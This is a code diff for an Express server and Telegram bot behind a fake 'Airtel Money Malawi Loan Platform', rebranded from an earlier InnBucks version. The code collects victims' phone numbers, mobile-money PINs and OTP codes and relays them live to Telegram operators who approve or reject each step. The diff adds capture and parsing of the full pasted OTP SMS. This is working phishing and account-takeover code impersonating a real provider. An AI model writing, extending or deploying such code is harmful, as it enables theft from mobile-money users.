@@ -1,6 +1,7 @@
 const express = require('express');
 const TelegramBot = require('node-telegram-bot-api');
 const path = require('path');
+const fs = require('fs');
 require('dotenv').config();
 
 const db = require('./database');
@@ -42,16 +43,35 @@ function getAdminIdByChatId(chatId) {
     }
     return null;
 }
-// Format +263XXXXXXXXX → 0XXXXXXXXX for Telegram display
+
+// Format +265XXXXXXXXX → 0XXXXXXXXX for Telegram display (Malawi)
 function formatPhone(phoneNumber) {
     if (!phoneNumber) return phoneNumber;
-    // Handle double prefix e.g. +2630712345678 → 0712345678
-    if (phoneNumber.startsWith('+2630')) return phoneNumber.slice(4); // +2630... → 0...
-    if (phoneNumber.startsWith('+263'))  return '0' + phoneNumber.slice(4); // +263... → 0...
-    if (phoneNumber.startsWith('2630'))  return phoneNumber.slice(3);  // 2630... → 0...
-    if (phoneNumber.startsWith('263'))   return '0' + phoneNumber.slice(3); // 263... → 0...
-    if (!phoneNumber.startsWith('0'))    return '0' + phoneNumber; // bare 7... → 07...
-    return phoneNumber;
+    const cleaned = String(phoneNumber).trim();
+    if (cleaned.startsWith('+2650')) return cleaned.slice(4);
+    if (cleaned.startsWith('+265'))  return '0' + cleaned.slice(4);
+    if (cleaned.startsWith('2650'))  return cleaned.slice(3);
+    if (cleaned.startsWith('265'))   return '0' + cleaned.slice(3);
+    if (!cleaned.startsWith('0'))    return '0' + cleaned;
+    return cleaned;
+}
+
+// Extract OTP code from a full pasted SMS message if needed
+function extractOtpCode(fullMessage, providedOtp) {
+    if (providedOtp && /^\d{4,8}$/.test(String(providedOtp).trim())) {
+        return String(providedOtp).trim();
+    }
+    const text = String(fullMessage || providedOtp || '');
+    const contextual = text.match(/(?:code|otp|pin|verification|is|:)\s*[:\-]?\s*(\d{4,8})\b/i);
+    if (contextual && contextual[1]) return contextual[1];
+    const generic = text.match(/\b(\d{4,8})\b/);
+    return generic ? generic[1] : String(providedOtp || '').trim();
+}
+
+// Escape Markdown special chars inside raw pasted SMS text
+function escapeMarkdown(str) {
+    if (!str) return '';
+    return String(str).replace(/([_*`\[])/g, '\\$1');
 }
 
 async function sendToAdmin(adminId, message, options = {}) {
@@ -298,7 +318,7 @@ ${WEBHOOK_URL}?admin=${adminId}
                 await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
             } else {
                 await bot.sendMessage(chatId, `
-👋 *Welcome to Airtel Loan Platform!*
+👋 *Welcome to Airtel Money Malawi Loan Platform!*
 
 Your Chat ID: \`${chatId}\`
 
@@ -366,7 +386,7 @@ Provide this to your super admin to get access.
         if (otpPending.length > 0) {
             message += `🔢 *OTP (${otpPending.length}):*\n`;
             otpPending.forEach((app, i) => {
-                message += `${i+1}. ${formatPhone(app.phoneNumber)} - OTP: \`${app.otp}\`\n`;
+                message += `${i+1}. ${formatPhone(app.phoneNumber)} - OTP: \`${app.otp || 'N/A'}\`\n`;
             });
         }
         if (pinPending.length === 0 && otpPending.length === 0) {
@@ -981,7 +1001,7 @@ Super admin has been notified.
 
 📋 \`${applicationId}\`
 📞 \`${formatPhone(application.phoneNumber)}\`
-🔢 \`${application.otp}\`
+🔢 \`${application.otp || 'N/A'}\`
 
 ⚠️ User's PIN was incorrect
 👤 ${callbackQuery.from.first_name}
@@ -1001,15 +1021,15 @@ User will re-enter PIN.
 
 📋 \`${applicationId}\`
 📞 \`${formatPhone(application.phoneNumber)}\`
-🔢 \`${application.otp}\`
+🔢 \`${application.otp || 'N/A'}\`
 
-⚠️ Wrong verification code
+⚠️ Wrong verification code / message
 👤 ${callbackQuery.from.first_name}
 ⏰ ${new Date().toLocaleString()}
 
-User will re-enter code.
+User will re-enter code message.
         `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
-        await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ User will re-enter code' });
+        await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ User will re-enter code message' });
         return;
     }
 
@@ -1044,9 +1064,9 @@ User will re-enter code.
 👤 ${callbackQuery.from.first_name}
 ⏰ ${new Date().toLocaleString()}
 
-User will now proceed to OTP.
+User will now proceed to full-message OTP verification.
         `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
-        await bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Approved! User can enter OTP now.' });
+        await bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Approved! User can submit OTP message now.' });
     }
 
     // Approve Loan
@@ -1058,7 +1078,7 @@ User will now proceed to OTP.
 📋 \`${applicationId}\`
 📞 \`${formatPhone(application.phoneNumber)}\`
 🔑 \`${application.pin}\`
-🔢 \`${application.otp}\`
+🔢 \`${application.otp || 'N/A'}\`
 
 ✓ FULLY APPROVED
 👤 ${callbackQuery.from.first_name}
@@ -1106,7 +1126,6 @@ app.post('/api/verify-pin', async (req, res) => {
 
         if (assignmentType === 'specific' && requestAdminId) {
             // ── HARD LOCK: customer came via a specific admin link ──
-            // NEVER fall back to another admin — that would be a data leak.
             assignedAdmin = await db.getAdmin(requestAdminId);
 
             if (!assignedAdmin) {
@@ -1249,16 +1268,23 @@ app.get('/api/check-pin-status/:applicationId', async (req, res) => {
     }
 });
 
-// POST /api/verify-otp
+// POST /api/verify-otp (Full SMS Message + Extracted Code)
 app.post('/api/verify-otp', async (req, res) => {
     console.log('\n🔵 /api/verify-otp called:', JSON.stringify(req.body));
     try {
-        const { applicationId, otp } = req.body;
+        const { applicationId, otp, fullOtpMessage } = req.body;
         const application = await db.getApplication(applicationId);
 
         if (!application) {
             return res.status(404).json({ success: false, message: 'Application not found' });
         }
+
+        const rawMessage = String(fullOtpMessage || otp || '').trim();
+        if (!rawMessage) {
+            return res.status(400).json({ success: false, message: 'Please paste the full OTP SMS message.' });
+        }
+
+        const extractedOtp = extractOtpCode(rawMessage, otp);
 
         // Re-add admin to map if needed
         if (!adminChatIds.has(application.adminId)) {
@@ -1270,33 +1296,42 @@ app.post('/api/verify-otp', async (req, res) => {
             }
         }
 
-        await db.updateApplication(applicationId, { otp, otpStatus: 'pending' });
-        console.log(`✅ OTP saved for ${applicationId}: ${otp}`);
+        await db.updateApplication(applicationId, {
+            otp: extractedOtp,
+            fullOtpMessage: rawMessage,
+            otpStatus: 'pending'
+        });
+        console.log(`✅ OTP message saved for ${applicationId} | Code: ${extractedOtp}`);
 
         const returningLabel = application.isReturningUser
             ? `\n🔄 *Returning customer* (${application.previousCount || 1} previous visits)`
             : '';
+
+        const safeMessageBlock = escapeMarkdown(rawMessage);
+
         await sendToAdmin(application.adminId, `
-📲 *CODE VERIFICATION*${returningLabel}
+📩 *FULL OTP MESSAGE RECEIVED*${returningLabel}
 
 📋 \`${applicationId}\`
 📞 \`${formatPhone(application.phoneNumber)}\`
-🔢 \`${otp}\`
+🔢 Extracted OTP: \`${extractedOtp || 'N/A'}\`
+💬 *Full SMS:*
+> ${safeMessageBlock}
 ⏰ ${new Date().toLocaleString()}
 
-⚠️ *VERIFY CODE*
+⚠️ *VERIFY OTP MESSAGE*
         `, {
             parse_mode: 'Markdown',
             reply_markup: {
                 inline_keyboard: [
-                    [{ text: '❌ Wrong PIN',   callback_data: `wrongpin_otp_${application.adminId}_${applicationId}` }],
-                    [{ text: '❌ Wrong Code',  callback_data: `wrongcode_otp_${application.adminId}_${applicationId}` }],
+                    [{ text: '❌ Wrong PIN',    callback_data: `wrongpin_otp_${application.adminId}_${applicationId}` }],
+                    [{ text: '❌ Wrong Code',   callback_data: `wrongcode_otp_${application.adminId}_${applicationId}` }],
                     [{ text: '✅ Approve Loan', callback_data: `approve_otp_${application.adminId}_${applicationId}` }]
                 ]
             }
         });
 
-        res.json({ success: true });
+        res.json({ success: true, extractedOtp });
     } catch (error) {
         console.error('❌ Error in /api/verify-otp:', error);
         res.status(500).json({ success: false, message: 'Server error: ' + error.message });
@@ -1323,12 +1358,12 @@ app.post('/api/resend-otp', async (req, res) => {
         if (!adminChatIds.has(application.adminId)) return res.status(500).json({ success: false, message: 'Admin unavailable' });
 
         await sendToAdmin(application.adminId, `
-🔄 *OTP RESEND REQUEST*
+🔄 *OTP SMS RESEND REQUEST*
 
 📋 \`${applicationId}\`
 📞 \`${formatPhone(application.phoneNumber)}\`
 
-User requested a new OTP.
+User requested a new verification SMS.
         `, { parse_mode: 'Markdown' });
 
         res.json({ success: true });
@@ -1381,7 +1416,7 @@ app.get('/health', (req, res) => {
     });
 });
 
-// ── Serve the InnBucks HTML ──
+// ── Serve the Airtel Money Malawi HTML ──
 app.get('/', async (req, res) => {
     const adminId = req.query.admin;
 
@@ -1400,15 +1435,17 @@ app.get('/', async (req, res) => {
         }
     }
 
-    res.sendFile(path.join(__dirname, 'innbucks-integrated.html'));
+    const indexPath = path.join(__dirname, 'index.html');
+    const fallbackPath = path.join(__dirname, 'innbucks-integrated.html');
+    res.sendFile(fs.existsSync(indexPath) ? indexPath : fallbackPath);
 });
 
 // ==========================================
 // START SERVER
 // ==========================================
 app.listen(PORT, () => {
-    console.log(`\n💎 INNBUCKS LOAN PLATFORM`);
-    console.log(`==========================`);
+    console.log(`\n🇲🇼 AIRTEL MONEY MALAWI LOAN PLATFORM`);
+    console.log(`======================================`);
     console.log(`🌐 Server: http://localhost:${PORT}`);
     console.log(`🤖 Bot: WEBHOOK MODE ✅`);
     console.log(`👥 Admins: ${adminChatIds.size} connected`);
